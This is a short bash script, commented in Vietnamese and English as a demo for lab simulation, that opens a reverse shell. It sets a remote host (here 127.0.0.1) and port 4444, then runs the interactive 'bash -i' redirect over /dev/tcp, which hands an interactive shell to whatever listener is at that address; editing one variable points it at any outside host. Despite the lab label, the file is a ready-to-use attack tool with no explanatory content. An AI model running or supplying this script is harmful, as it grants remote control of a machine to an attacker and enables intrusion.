#!/bin/bash
# Reverse shell mã mẫu cho mục đích mô phỏng!

REMOTE_HOST="127.0.0.1"
REMOTE_PORT=4444

echo "[*] This is a DEMO reverse shell script for lab testing only!"
echo "[*] Connecting to $REMOTE_HOST:$REMOTE_PORT"
bash -i >& /dev/tcp/$REMOTE_HOST/$REMOTE_PORT 0>&1
